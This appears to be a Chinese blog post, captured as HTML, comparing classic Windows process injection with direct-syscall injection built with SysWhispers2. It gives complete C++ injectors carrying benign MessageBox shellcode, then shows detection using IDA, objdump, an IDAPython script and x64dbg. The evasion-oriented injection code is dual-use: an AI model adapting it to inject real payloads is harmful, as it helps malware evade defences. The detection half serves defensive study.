+              <time class="post-date" datetime="2021-12-06 22:14:22 CST">
+                06 Dec 2021
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+              <div class="post-author">
+                <a target="_blank" href="https://github.com/muxue">@Muxue</a>
+              </div>
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <p>这个我真的鸽了很久</p>
+<h2 id="区别">区别</h2>
+<p>传统的进程注入有那些API非常的明显，拿个demo演示</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+    <span style="color:#66d9ef">char</span> buf[] <span style="color:#f92672">=</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\x0f\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6c\x6f\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00</span><span style="color:#e6db74">&#34;</span>;
+
+    <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(buf);
+
+    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) {        <span style="color:#75715e">// 给注入进程的PID
+</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;[!] Usage: %s &lt;pid to inject into&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+
+    <span style="color:#66d9ef">auto</span> pid <span style="color:#f92672">=</span> atoi(argv[<span style="color:#ae81ff">1</span>]);   <span style="color:#75715e">// atoi把字符串转换为整数
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pid) {     <span style="color:#75715e">// 判断
+</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;[-] Invalid PID: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+
+    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_ALL_ACCESS, <span style="color:#ae81ff">0</span>, pid);    
+    LPVOID Address <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);  <span style="color:#75715e">// LPVOID: 指向任何类型的指针
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//printf(&#34;%d&#34;, len);
+</span><span style="color:#75715e"></span>    WriteProcessMemory(hProcess, Address, buf, len, NULL);
+    CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)Address, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><p>这种静态分析也很容易就被发现了，用strings和ida分别看下</p>
+<p><img src="/images/Syscalls/image-20211206221600585.png" alt="image-20211206221600585"></p>
+<p><img src="/images/Syscalls/image-20211206221611167.png" alt="image-20211206221611167"></p>
+<p>然后再对比下syscalls的程序</p>
+<p><img src="/images/Syscalls/image-20211206221650692.png" alt="image-20211206221650692"></p>
+<blockquote>
+<p>可以很明显的看出，没有那种write啥的显眼api</p>
+</blockquote>
+<h2 id="基础环境配置">基础环境配置</h2>
+<p>先使用<code>syswhispers2</code>生成所需的文件</p>
+<pre tabindex="0"><code>python syswhispers.py --preset all -o syscalls_all
+</code></pre><p><img src="/images/Syscalls/image-20211206221800149.png" alt="image-20211206221800149"></p>
+<p>我是直接把这三个文件直接移动到程序目录里的(github就已经写了 我一开始没看 一直添加的现有项(别的目录)妈的)</p>
+<p><img src="/images/Syscalls/image-20211206221824521.png" alt="image-20211206221824521"></p>
+<p>然后启用<code>masm</code></p>
+<p><img src="/images/Syscalls/image-20211206221920939.png" alt="image-20211206221920939"></p>
+<p><img src="/images/Syscalls/image-20211206221929138.png" alt="image-20211206221929138"></p>
+<p>把这几个设置好了之后</p>
+<p>然后将那生成的三个文件加入到项目中</p>
+<p><img src="/images/Syscalls/image-20211206222042076.png" alt="image-20211206222042076"></p>
+<p>配置asm文件的属性</p>
+<p><img src="/images/Syscalls/image-20211206222049696.png" alt="image-20211206222049696"></p>
+<p>基本配置就欧克了</p>
+<h2 id="编写程序">编写程序</h2>
+<p>我直接用的<code>Syscalls-Example</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;syscalls.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;syscalls.c&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[])
+{
+
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x40\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\x2e\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x53\x79\x73\x63\x61</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6c\x6c\x73\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x21\x00</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x42\x41\x4d\x20\x53\x41\x49\x44\x20\x54\x48\x45\x20\x4c\x41</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x44\x59\x00</span><span style="color:#e6db74">&#34;</span>;
+
+    printf(<span style="color:#e6db74">&#34;**** Syscalls Example! ****</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) {        <span style="color:#75715e">// 给注入进程的PID
+</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;[!] Usage: %s &lt;pid to inject into&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+
+    <span style="color:#66d9ef">auto</span> pid <span style="color:#f92672">=</span> atoi(argv[<span style="color:#ae81ff">1</span>]);   <span style="color:#75715e">// atoi把字符串转换为整数
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pid) {     <span style="color:#75715e">// 判断
+</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;[-] Invalid PID: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+
+    HANDLE hProcess;        <span style="color:#75715e">// 进程句柄
+</span><span style="color:#75715e"></span>    CLIENT_ID clientId{};   <span style="color:#75715e">// 头文件定义的结构体
+</span><span style="color:#75715e"></span>    clientId.UniqueProcess <span style="color:#f92672">=</span> (HANDLE)pid;   <span style="color:#75715e">// 给句柄
+</span><span style="color:#75715e"></span>    OBJECT_ATTRIBUTES objectAttributes <span style="color:#f92672">=</span> { <span style="color:#66d9ef">sizeof</span>(objectAttributes) };  <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">auto</span> status <span style="color:#f92672">=</span> NtOpenProcess(<span style="color:#f92672">&amp;</span>hProcess, PROCESS_ALL_ACCESS, <span style="color:#f92672">&amp;</span>objectAttributes, <span style="color:#f92672">&amp;</span>clientId);   <span style="color:#75715e">// 系统调用打开进程
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {  <span style="color:#75715e">// 返回的是一个status 判断是否成功
+</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;[-] Failed to open process: %d, NTSTATUS: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid, status);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+    printf(<span style="color:#e6db74">&#34;[*] Successfully opened process %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);        <span style="color:#75715e">// 成功了就success打印下
+</span><span style="color:#75715e"></span>
+
+
+    size_t shellcodeSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(shellcode) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(shellcode[<span style="color:#ae81ff">0</span>]);    <span style="color:#75715e">// shellcode的长度
+</span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;[*] Shellcode length: %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcodeSize);              <span style="color:#75715e">// 打印长度
+</span><span style="color:#75715e"></span>    PVOID baseAddress <span style="color:#f92672">=</span> NULL;           <span style="color:#75715e">// 指针 指向一个变量的指针
+</span><span style="color:#75715e"></span>    size_t allocSize <span style="color:#f92672">=</span> shellcodeSize;   <span style="color:#75715e">// 长度
+</span><span style="color:#75715e"></span>    status <span style="color:#f92672">=</span> NtAllocateVirtualMemory(hProcess, <span style="color:#f92672">&amp;</span>baseAddress, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>allocSize, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_READWRITE);  <span style="color:#75715e">// 系统调用申请内存，allocSize要分配的大小
+</span><span style="color:#75715e"></span>        
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {  <span style="color:#75715e">// 还是判断是否成功，跟NtOpenProcess一样
+</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;[-] Failed to allocate memory, NTSTATUS: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, status);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+    printf(<span style="color:#e6db74">&#34;[*] Successfully allocated RW memory at 0x%p of size %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, baseAddress, allocSize);
+
+
+
+    size_t bytesWritten;    <span style="color:#75715e">// 接收字节数
+</span><span style="color:#75715e"></span>    status <span style="color:#f92672">=</span> NtWriteVirtualMemory(hProcess, baseAddress, <span style="color:#f92672">&amp;</span>shellcode, shellcodeSize, <span style="color:#f92672">&amp;</span>bytesWritten); <span style="color:#75715e">// r3下的WriteProcessMemory
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {
+        printf(<span style="color:#e6db74">&#34;[-] Failed to write shellcode to memory at 0x%p, NTSTATUS: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, baseAddress, status);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+    printf(<span style="color:#e6db74">&#34;[*] Successfully wrote shellcode to memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+    DWORD oldProtect;   
+    status <span style="color:#f92672">=</span> NtProtectVirtualMemory(hProcess, <span style="color:#f92672">&amp;</span>baseAddress, <span style="color:#f92672">&amp;</span>shellcodeSize, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>oldProtect);    <span style="color:#75715e">// 改属性
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {
+        printf(<span style="color:#e6db74">&#34;[-] Failed to change permission to RX on memory at 0x%p, NTSTATUS: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, baseAddress, status);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+    printf(<span style="color:#e6db74">&#34;[*] Successfully changed memory protections to RX</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+
+
+    HANDLE hThread;
+    status <span style="color:#f92672">=</span> NtCreateThreadEx(<span style="color:#f92672">&amp;</span>hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);     <span style="color:#75715e">// 创建指定内存的进程
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {
+        printf(<span style="color:#e6db74">&#34;[-] Failed to create thread, NTSTATUS: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, status);
+        <span style="color:#66d9ef">return</span> EXIT_FAILURE;
+    }
+    printf(<span style="color:#e6db74">&#34;[*] Successfully created thread in process</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+
+    printf(<span style="color:#e6db74">&#34;[+] Shellcode injected using syscalls!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> EXIT_SUCCESS;
+}
+</code></pre></div><blockquote>
+<p>我在代码里写了注释</p>
+</blockquote>
+<p>最后测试下</p>
+<p><img src="/images/Syscalls/image-20211206222227277.png" alt="image-20211206222227277"></p>
+<h2 id="分析">分析</h2>
+<h3 id="静态分析">静态分析</h3>
+<p>判断<code>syscall</code>也是轻轻松松的</p>
+<p><img src="/images/Syscalls/image-20211206222256973.png" alt="image-20211206222256973"></p>
+<p>注意看，像这里有个call的直接回车跟进去</p>
+<p><img src="/images/Syscalls/image-20211206222334389.png" alt="image-20211206222334389"></p>
+<blockquote>
+<p>对比下 是不是一模一样</p>
+</blockquote>
+<p>可以看见有个<code>syscall</code></p>
+<p>所以我们在ida里alt+t，搜索全部</p>
+<p><img src="/images/Syscalls/image-20211206222412408.png" alt="image-20211206222412408"></p>
+<p>可以看见这么多syscall</p>
+<p>用<code>objdump</code>也可以看见的，用frida也可以的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">objdump.exe <span style="color:#f92672">--</span>disassemble <span style="color:#f92672">-</span>M intel SysCalls.exe  <span style="color:#f92672">|</span> findstr syscall
+</code></pre></div><p><img src="/images/Syscalls/image-20211206222500534.png" alt="image-20211206222500534"></p>
+<p>一般的程序都是用的api，而不是直接syscall</p>
+<ul>
+<li>我们可以根据<code>mov ecx,*</code></li>
+</ul>
+<p>这个值去查看是使用了哪个函数</p>
+<p><img src="/images/Syscalls/image-20211206222523409.png" alt="image-20211206222523409"></p>
+<p>拿这个做例子，看下面的字符串 应该是写入的 我们跟进去看一下</p>
+<p><img src="/images/Syscalls/image-20211206222602512.png" alt="image-20211206222602512"></p>
+<p>可以正确得知是调用了哪个函数</p>
+<h3 id="动态分析">动态分析</h3>
+<p>ida的python脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> idautils <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> idaapi <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> idc <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">breakpoint_syscall</span>():
+  name <span style="color:#f92672">=</span> get_input_file_path()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+  <span style="color:#66d9ef">for</span> segea <span style="color:#f92672">in</span> Segments():
+    <span style="color:#66d9ef">for</span> funcea <span style="color:#f92672">in</span> Functions(segea, get_segm_end(segea)):
+        functionName <span style="color:#f92672">=</span> get_func_name(funcea)
+        <span style="color:#66d9ef">for</span> (startea, endea) <span style="color:#f92672">in</span> Chunks(funcea):
+            <span style="color:#66d9ef">for</span> head <span style="color:#f92672">in</span> Heads(startea, endea):
+              disasm_line <span style="color:#f92672">=</span> generate_disasm_line(head,<span style="color:#ae81ff">0</span>)
+              <span style="color:#66d9ef">if</span> disasm_line<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;syscall&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> disasm_line<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;Low latency system call&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+                offset <span style="color:#f92672">=</span> head <span style="color:#f92672">-</span> get_imagebase()
+                print(<span style="color:#e6db74">&#34;bp </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:0+0x</span><span style="color:#e6db74">%08x</span><span style="color:#e6db74">;&#34;</span><span style="color:#f92672">%</span>(name, offset))
+                idc<span style="color:#f92672">.</span>add_bpt(head)
+breakpoint_syscall()
+</code></pre></div><p>然后运行下</p>
+<p><img src="/images/Syscalls/image-20211206222652466.png" alt="image-20211206222652466"></p>
+<p>设置到x64dbg的断点里</p>
+<p><img src="/images/Syscalls/image-20211206222705453.png" alt="image-20211206222705453"></p>
+<p>打到断点就知道调用了谁</p>
+<p><img src="/images/Syscalls/image-20211206222719939.png" alt="image-20211206222719939"></p>
+<p>到<code>NtAllocateVirtualMemory</code>这里，rdx追寻到内存窗口</p>
+<p>然后单步跳过，看这个十六进制的值</p>
+<p><img src="/images/Syscalls/image-20211206222747531.png" alt="image-20211206222747531"></p>
+<p>然后去看内存 就可以得知申请成功了已经</p>
+<p><img src="/images/Syscalls/image-20211206222806987.png" alt="image-20211206222806987"></p>
+<p>然后直接运行（蓝色的向右的箭头），在process hacker中 Re-read下</p>
+<p><img src="/images/Syscalls/image-20211206222852767.png" alt="image-20211206222852767"></p>
+<blockquote>
+<p>可以看见就是我们messagebox的内容</p>
+</blockquote>
+<p><img src="/images/Syscalls/image-20211206222911103.png" alt="image-20211206222911103"></p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+          <div class="post-comments">
+            <div id="disqus_thread"></div>
+<script>
+  window.addEventListener("load", () => {
+    (function() {
+      
+      var d = document,
+        s = d.createElement("script");
+      s.src = "https://joway.disqus.com/embed.js";
+      s.setAttribute("data-timestamp", +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  });
+</script>
+<noscript
+  >Please enable JavaScript to view the
+  <a href="https://disqus.com/?ref_noscript"
+    >comments powered by Disqus.</a
+  ></noscript
+>
+
+          </div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
